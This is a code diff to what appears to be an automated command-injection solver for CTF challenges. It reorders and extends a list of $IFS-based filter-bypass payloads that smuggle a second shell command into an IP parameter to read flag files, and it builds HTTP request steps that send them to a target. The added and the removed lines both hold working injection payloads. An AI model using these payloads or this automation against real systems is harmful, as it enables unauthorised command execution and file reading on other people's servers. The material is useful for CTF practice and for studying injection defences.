@@ -1921,6 +1921,24 @@ class CMDiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
+        # --- $IFS space bypass (Ping Ping Ping style) — early position ---
+        # This is one of the most common CTF patterns: spaces blocked, use $IFS
+        ifs_payloads = [
+            "127.0.0.1;cat$IFS$9flag.php",
+            "127.0.0.1;cat${IFS}flag.php",
+            "127.0.0.1;cat$IFS/flag",
+            "127.0.0.1;cat$IFS$9/flag",
+        ]
+        for ifs_p in ifs_payloads:
+            steps.append({
+                "name": f"ifs_{param}_{hash(ifs_p) & 0xffff:x}",
+                "description": f"$IFS空格绕过 ({param}): {ifs_p[:35]}",
+                "method": method,
+                "path": path,
+                "params" if method == "GET" else "data": {param: ifs_p},
+                "extract_flag": True,
+            })
+
         # Standard separators
         separators = [";", "|", "`", "$()", "&&", "||"]
         for sep in separators:
@@ -1995,25 +2013,6 @@ class CMDiMachine(RouteStateMachine):
                 "params": alt_data,
                 "extract_flag": True,
             })
-
-        # --- $IFS space bypass (Ping Ping Ping style) ---
-        ifs_payloads = [
-            "127.0.0.1;cat$IFS$9flag.php",
-            "127.0.0.1;cat${IFS}flag.php",
-            "127.0.0.1;cat$IFS/flag",
-        ]
-        # Try with primary param AND 'ip' (most common CMDi alt param)
-        ifs_params = [param] if param == "ip" else [param, "ip"]
-        for ifs_param in ifs_params:
-            for ifs_p in ifs_payloads:
-                steps.append({
-                    "name": f"ifs_{ifs_param}_{hash(ifs_p) & 0xffff:x}",
-                    "description": f"$IFS空格绕过 ({ifs_param}): {ifs_p[:35]}",
-                    "method": method,
-                    "path": path,
-                    "params" if method == "GET" else "data": {ifs_param: ifs_p},
-                    "extract_flag": True,
-                })
 
         # --- Non-alpha RCE (XOR/NOT bypass for preg_match letter filter) ---
         # These payloads use ^ and ~ operators to construct commands without letters
